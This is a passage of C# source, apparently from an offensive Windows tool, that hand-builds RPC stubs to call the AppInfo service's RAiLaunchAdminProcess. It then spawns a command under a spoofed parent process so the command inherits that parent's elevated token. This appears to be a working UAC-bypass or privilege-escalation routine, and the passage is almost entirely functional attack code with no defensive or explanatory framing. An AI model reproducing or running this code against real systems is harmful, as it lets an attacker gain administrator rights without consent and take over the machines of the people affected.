            Marshal.WriteInt16(_pClientInterface, 42, 0); // Minor = 0

            // pAutoHandle: pointer to a zero-initialized handle
            _pAutoHandle = Marshal.AllocHGlobal(IntPtr.Size);
            Marshal.WriteIntPtr(_pAutoHandle, IntPtr.Zero);

            // Pin MIDL allocator delegates
            _midlAllocDel = new MidlAllocDelegate(MidlAlloc);
            _midlFreeDel = new MidlFreeDelegate(MidlFree);

            // Build MIDL_STUB_DESC (160 bytes on x64)
            _pStubDesc = Marshal.AllocHGlobal(160);
            ZeroMem(_pStubDesc, 160);
            Marshal.WriteIntPtr(_pStubDesc, 0, _pClientInterface);                                     // RpcInterfaceInformation
            Marshal.WriteIntPtr(IntPtrAdd(_pStubDesc, 8), Marshal.GetFunctionPointerForDelegate(_midlAllocDel));  // pfnAllocate
            Marshal.WriteIntPtr(IntPtrAdd(_pStubDesc, 16), Marshal.GetFunctionPointerForDelegate(_midlFreeDel));  // pfnFree
            Marshal.WriteIntPtr(IntPtrAdd(_pStubDesc, 24), _pAutoHandle);                              // pAutoHandle
            Marshal.WriteIntPtr(IntPtrAdd(_pStubDesc, 64), _typeFmtPin.AddrOfPinnedObject());          // pFormatTypes
            Marshal.WriteInt32(IntPtrAdd(_pStubDesc, 72), 1);                                          // fCheckBounds
            Marshal.WriteInt32(IntPtrAdd(_pStubDesc, 76), 0x50002);                                    // ndr version
            Marshal.WriteInt32(IntPtrAdd(_pStubDesc, 88), 0x801026e);                                  // MIDL version
            Marshal.WriteIntPtr(IntPtrAdd(_pStubDesc, 120), (IntPtr)1);                                // mFlags
        }

        private void FreeMidlStubs()
        {
            if (_procFmtPin.IsAllocated) _procFmtPin.Free();
            if (_typeFmtPin.IsAllocated) _typeFmtPin.Free();
            if (_pStubDesc != IntPtr.Zero) Marshal.FreeHGlobal(_pStubDesc);
            if (_pClientInterface != IntPtr.Zero) Marshal.FreeHGlobal(_pClientInterface);
            if (_pAutoHandle != IntPtr.Zero) Marshal.FreeHGlobal(_pAutoHandle);
        }

        /// <summary>
        /// Create RPC binding handle to AppInfo service via ncalrpc.
        /// </summary>
        private IntPtr CreateBindingHandle()
        {
            IntPtr bindingHandle = IntPtr.Zero;
            IntPtr stringBinding = IntPtr.Zero;
            IntPtr pUuid = IntPtr.Zero;
            IntPtr pProtSeq = IntPtr.Zero;
            IntPtr pSid = IntPtr.Zero;
            IntPtr pQos = IntPtr.Zero;

            try
            {
                pUuid = Marshal.StringToHGlobalUni(AppInfoUuid.ToString());
                pProtSeq = Marshal.StringToHGlobalUni("ncalrpc");

                int status = _rpcStringBindingCompose(pUuid, pProtSeq,
                    IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, out stringBinding);

                if (status != 0)
                {
                    Console.WriteLine("[!] RpcStringBindingComposeW failed: " + status);
                    return IntPtr.Zero;
                }

                status = _rpcBindingFromStringBinding(stringBinding, out bindingHandle);
                _rpcStringFree(ref stringBinding);

                if (status != 0)
                {
                    Console.WriteLine("[!] RpcBindingFromStringBindingW failed: " + status);
                    return IntPtr.Zero;
                }

                // Create LocalSystem SID for RPC auth
                pSid = Marshal.AllocHGlobal(SECURITY_MAX_SID_SIZE);
                int cbSid = SECURITY_MAX_SID_SIZE;
                if (!_createWellKnownSid(WinLocalSystemSid, IntPtr.Zero, pSid, ref cbSid))
                {
                    Console.WriteLine("[!] CreateWellKnownSid failed");
                    _rpcBindingFree(ref bindingHandle);
                    return IntPtr.Zero;
                }

                // Build RPC_SECURITY_QOS_V3 (40 bytes on x64)
                // Layout: Version(4) + Capabilities(4) + IdentityTracking(4) + ImpersonationType(4)
                //       + AdditionalSecurityInfoType(4) + pad(4) + u(8) + Sid(8) = 40 bytes
                pQos = Marshal.AllocHGlobal(40);
                ZeroMem(pQos, 40);
                Marshal.WriteInt32(pQos, 0, 3);   // Version = 3
                Marshal.WriteInt32(pQos, 4, 1);   // Capabilities = RPC_C_QOS_CAPABILITIES_MUTUAL_AUTH
                Marshal.WriteInt32(pQos, 8, 0);   // IdentityTracking = 0
                Marshal.WriteInt32(pQos, 12, 3);  // ImpersonationType = RPC_C_IMP_LEVEL_IMPERSONATE
                Marshal.WriteInt32(pQos, 16, 0);  // AdditionalSecurityInfoType = 0
                // offset 20-23: padding
                // offset 24-31: u (union, zeroed)
                Marshal.WriteIntPtr(IntPtrAdd(pQos, 32), pSid); // Sid

                status = _rpcBindingSetAuthInfoEx(
                    bindingHandle, IntPtr.Zero,
                    RPC_C_AUTHN_LEVEL_PKT_PRIVACY,
                    RPC_C_AUTHN_WINNT,
                    IntPtr.Zero, 0, pQos);

                if (status != 0)
                {
                    Console.WriteLine("[!] RpcBindingSetAuthInfoExW failed: " + status);
                    _rpcBindingFree(ref bindingHandle);
                    return IntPtr.Zero;
                }

                IntPtr result = bindingHandle;
                bindingHandle = IntPtr.Zero; // prevent cleanup from freeing it
                return result;
            }
            finally
            {
                if (pUuid != IntPtr.Zero) Marshal.FreeHGlobal(pUuid);
                if (pProtSeq != IntPtr.Zero) Marshal.FreeHGlobal(pProtSeq);
                if (pSid != IntPtr.Zero) Marshal.FreeHGlobal(pSid);
                if (pQos != IntPtr.Zero) Marshal.FreeHGlobal(pQos);
            }
        }

        /// <summary>
        /// Launch a process via AppInfo RPC (RAiLaunchAdminProcess).
        /// </summary>
        private bool AicLaunchAdminProcess(
            string exePath, int startFlags, int creationFlags, int showFlags,
            out IntPtr hProcess, out IntPtr hThread, out int processId, out int threadId)
        {
            hProcess = IntPtr.Zero;
            hThread = IntPtr.Zero;
            processId = 0;
            threadId = 0;

            IntPtr bindingHandle = IntPtr.Zero;
            IntPtr asyncState = IntPtr.Zero;
            IntPtr sInfo = IntPtr.Zero;
            IntPtr pInfo = IntPtr.Zero;
            IntPtr pElev = IntPtr.Zero;
            IntPtr pNewToken = IntPtr.Zero;
            IntPtr pExePath = IntPtr.Zero;
            IntPtr pCmdLine = IntPtr.Zero;
            IntPtr pCurrentDir = IntPtr.Zero;
            IntPtr pDesktop = IntPtr.Zero;
            IntPtr hEvent = IntPtr.Zero;
            IntPtr pReply = IntPtr.Zero;

            try
            {
                // Create RPC binding
                bindingHandle = CreateBindingHandle();
                if (bindingHandle == IntPtr.Zero)
                    return false;

                // Initialize RPC_ASYNC_STATE
                asyncState = Marshal.AllocHGlobal(RPC_ASYNC_STATE_SIZE);
                ZeroMem(asyncState, RPC_ASYNC_STATE_SIZE);

                int rpcStatus = _rpcAsyncInitHandle(asyncState, RPC_ASYNC_STATE_SIZE);
                if (rpcStatus != 0)
                {
                    Console.WriteLine("[!] RpcAsyncInitializeHandle failed: " + rpcStatus);
                    return false;
                }

                hEvent = _createEventW(IntPtr.Zero, false, false, IntPtr.Zero);
                if (hEvent == IntPtr.Zero)
                {
                    Console.WriteLine("[!] CreateEvent failed for async RPC");
                    return false;
                }

                Marshal.WriteInt32(IntPtrAdd(asyncState, RPC_ASYNC_NOTIFICATION_TYPE), RpcNotificationTypeEvent);
                Marshal.WriteIntPtr(IntPtrAdd(asyncState, RPC_ASYNC_HEVENT), hEvent);

                // Build APP_STARTUP_INFO
                sInfo = Marshal.AllocHGlobal(APP_STARTUP_INFO_SIZE);
                ZeroMem(sInfo, APP_STARTUP_INFO_SIZE);
                Marshal.WriteInt32(IntPtrAdd(sInfo, APP_STARTUP_INFO_DWFLAGS), STARTF_USESHOWWINDOW);
                Marshal.WriteInt16(IntPtrAdd(sInfo, APP_STARTUP_INFO_WSHOWWINDOW), (short)showFlags);

                // Build APP_PROCESS_INFORMATION (output)
                pInfo = Marshal.AllocHGlobal(APP_PROCESS_INFO_SIZE);
                ZeroMem(pInfo, APP_PROCESS_INFO_SIZE);

                // Elevation type (output)
                pElev = Marshal.AllocHGlobal(4);
                Marshal.WriteInt32(pElev, 0);

                // New token handle (output — not used but required by IDL)
                pNewToken = Marshal.AllocHGlobal(IntPtr.Size);
                Marshal.WriteIntPtr(pNewToken, IntPtr.Zero);

                // Marshal strings
                pExePath = Marshal.StringToHGlobalUni(exePath);
                pCmdLine = Marshal.StringToHGlobalUni(exePath); // CommandLine = same as ExecutablePath
                pCurrentDir = Marshal.StringToHGlobalUni("C:\\Windows");
                pDesktop = Marshal.StringToHGlobalUni("WinSta0\\Default");

                // Call NdrAsyncClientCall (RAiLaunchAdminProcess)
                _ndrAsyncClientCall(
                    _pStubDesc,
                    _procFmtPin.AddrOfPinnedObject(),
                    asyncState,
                    bindingHandle,
                    pExePath,
                    pCmdLine,
                    (IntPtr)startFlags,
                    (IntPtr)creationFlags,
                    pCurrentDir,
                    pDesktop,
                    sInfo,
                    IntPtr.Zero,    // hWnd = NULL
                    (IntPtr)INFINITE,
                    pInfo,
                    pElev);

                // Wait for async completion
                _waitForSingleObject(hEvent, INFINITE);

                // Complete the async call
                pReply = Marshal.AllocHGlobal(IntPtr.Size);
                Marshal.WriteIntPtr(pReply, IntPtr.Zero);
                rpcStatus = _rpcAsyncCompleteCall(asyncState, pReply);
                IntPtr reply = Marshal.ReadIntPtr(pReply);

                if (rpcStatus != 0 || reply != IntPtr.Zero)
                {
                    Console.WriteLine("[!] RPC call failed: status=" + rpcStatus +
                        " reply=0x" + reply.ToString("X"));
                    return false;
                }

                // Extract results from APP_PROCESS_INFORMATION
                hProcess = Marshal.ReadIntPtr(pInfo, 0);
                hThread = Marshal.ReadIntPtr(pInfo, 8);
                processId = Marshal.ReadInt32(pInfo, 16);
                threadId = Marshal.ReadInt32(pInfo, 20);

                return true;
            }
            catch (Exception ex)
            {
                Console.WriteLine("[!] AicLaunchAdminProcess exception: " + ex.Message);
                return false;
            }
            finally
            {
                if (hEvent != IntPtr.Zero) _closeHandle(hEvent);
                if (bindingHandle != IntPtr.Zero) _rpcBindingFree(ref bindingHandle);
                if (asyncState != IntPtr.Zero) Marshal.FreeHGlobal(asyncState);
                if (sInfo != IntPtr.Zero) Marshal.FreeHGlobal(sInfo);
                if (pInfo != IntPtr.Zero) Marshal.FreeHGlobal(pInfo);
                if (pElev != IntPtr.Zero) Marshal.FreeHGlobal(pElev);
                if (pNewToken != IntPtr.Zero) Marshal.FreeHGlobal(pNewToken);
                if (pExePath != IntPtr.Zero) Marshal.FreeHGlobal(pExePath);
                if (pCmdLine != IntPtr.Zero) Marshal.FreeHGlobal(pCmdLine);
                if (pCurrentDir != IntPtr.Zero) Marshal.FreeHGlobal(pCurrentDir);
                if (pDesktop != IntPtr.Zero) Marshal.FreeHGlobal(pDesktop);
                if (pReply != IntPtr.Zero) Marshal.FreeHGlobal(pReply);
            }
        }

        /// <summary>
        /// Spawn a child process with the given parent process handle.
        /// Uses PROC_THREAD_ATTRIBUTE_PARENT_PROCESS so the child inherits the parent's token.
        /// </summary>
        private bool CreateProcessFromParent(IntPtr parentHandle, string commandLine)
        {
            IntPtr attrList = IntPtr.Zero;
            IntPtr pParent = IntPtr.Zero;
            IntPtr siEx = IntPtr.Zero;
            IntPtr pi = IntPtr.Zero;
            IntPtr pCmdLine = IntPtr.Zero;
            IntPtr pCurrentDir = IntPtr.Zero;
            IntPtr pDesktop = IntPtr.Zero;

            try
            {
                // Determine attribute list size
                IntPtr attrListSize = IntPtr.Zero;
                _initProcThreadAttrList(IntPtr.Zero, 1, 0, ref attrListSize);

                if (attrListSize == IntPtr.Zero)
                {
                    Console.WriteLine("[!] InitializeProcThreadAttributeList sizing failed");
                    return false;
                }

                attrList = Marshal.AllocHGlobal(attrListSize);
                if (!_initProcThreadAttrList(attrList, 1, 0, ref attrListSize))
                {
                    Console.WriteLine("[!] InitializeProcThreadAttributeList failed");
                    return false;
                }

                // Store parent handle in native memory and set attribute
                pParent = Marshal.AllocHGlobal(IntPtr.Size);
                Marshal.WriteIntPtr(pParent, parentHandle);

                if (!_updateProcThreadAttr(attrList, 0,
                    (IntPtr)PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
                    pParent, (IntPtr)IntPtr.Size, IntPtr.Zero, IntPtr.Zero))
                {
                    Console.WriteLine("[!] UpdateProcThreadAttribute failed");
                    return false;
                }

                // Build STARTUPINFOEX (112 bytes on x64)
                // STARTUPINFOW: 104 bytes + lpAttributeList: 8 bytes = 112 bytes
                int siExSize = 112;
                siEx = Marshal.AllocHGlobal(siExSize);
                ZeroMem(siEx, siExSize);

                pDesktop = Marshal.StringToHGlobalUni("WinSta0\\Default");

                Marshal.WriteInt32(siEx, 0, siExSize);                      // cb
                Marshal.WriteIntPtr(IntPtrAdd(siEx, 16), pDesktop);         // lpDesktop
                Marshal.WriteInt32(IntPtrAdd(siEx, 60), STARTF_USESHOWWINDOW); // dwFlags
                Marshal.WriteInt16(IntPtrAdd(siEx, 64), (short)SW_SHOW);    // wShowWindow
                Marshal.WriteIntPtr(IntPtrAdd(siEx, 104), attrList);        // lpAttributeList

                // Build PROCESS_INFORMATION (24 bytes)
                pi = Marshal.AllocHGlobal(24);
                ZeroMem(pi, 24);

                pCmdLine = Marshal.StringToHGlobalUni(commandLine);
                pCurrentDir = Marshal.StringToHGlobalUni("C:\\Windows\\System32");

                int flags = CREATE_UNICODE_ENVIRONMENT | EXTENDED_STARTUPINFO_PRESENT;

                bool result = _createProcessW(
                    IntPtr.Zero,    // lpApplicationName = NULL
                    pCmdLine,       // lpCommandLine
                    IntPtr.Zero,    // lpProcessAttributes
                    IntPtr.Zero,    // lpThreadAttributes
                    false,          // bInheritHandles
                    flags,
                    IntPtr.Zero,    // lpEnvironment
                    pCurrentDir,    // lpCurrentDirectory
                    siEx,           // lpStartupInfo (STARTUPINFOEX)
                    pi);            // lpProcessInformation

                if (result)
                {
                    // Close child process/thread handles
                    IntPtr childProc = Marshal.ReadIntPtr(pi, 0);
                    IntPtr childThread = Marshal.ReadIntPtr(pi, 8);
                    if (childThread != IntPtr.Zero) _closeHandle(childThread);
                    if (childProc != IntPtr.Zero) _closeHandle(childProc);
                }

                return result;
            }
            catch (Exception ex)
            {
                Console.WriteLine("[!] CreateProcessFromParent exception: " + ex.Message);
                return false;
            }
            finally
            {
                if (attrList != IntPtr.Zero)
                {
                    _deleteProcThreadAttrList(attrList);
                    Marshal.FreeHGlobal(attrList);
                }
                if (pParent != IntPtr.Zero) Marshal.FreeHGlobal(pParent);
                if (siEx != IntPtr.Zero) Marshal.FreeHGlobal(siEx);
                if (pi != IntPtr.Zero) Marshal.FreeHGlobal(pi);
                if (pCmdLine != IntPtr.Zero) Marshal.FreeHGlobal(pCmdLine);
                if (pCurrentDir != IntPtr.Zero) Marshal.FreeHGlobal(pCurrentDir);
                if (pDesktop != IntPtr.Zero) Marshal.FreeHGlobal(pDesktop);
            }
        }

        private static void ParseCommand(string command, out string file, out string parameters)
        {
            parameters = null;
            if (command.StartsWith("\""))
            {
                int endQuote = command.IndexOf('"', 1);
                if (endQuote > 0)
                {
                    file = command.Substring(1, endQuote - 1);
                    if (endQuote + 2 < command.Length)
                        parameters = command.Substring(endQuote + 2);
                }
                else
                {
                    file = command.TrimStart('"');
                }
            }
            else
            {
                int spaceIdx = command.IndexOf(' ');
                if (spaceIdx > 0)
                {
                    file = command.Substring(0, spaceIdx);
                    parameters = command.Substring(spaceIdx + 1);
                }
                else
                {
                    file = command;
                }
            }
        }

        private static void ZeroMem(IntPtr ptr, int size)
        {
            byte[] zeros = new byte[size];
            Marshal.Copy(zeros, 0, ptr, size);
        }

        private static IntPtr IntPtrAdd(IntPtr ptr, int offset)
        {
            return new IntPtr(ptr.ToInt64() + offset);
        }
    }
}
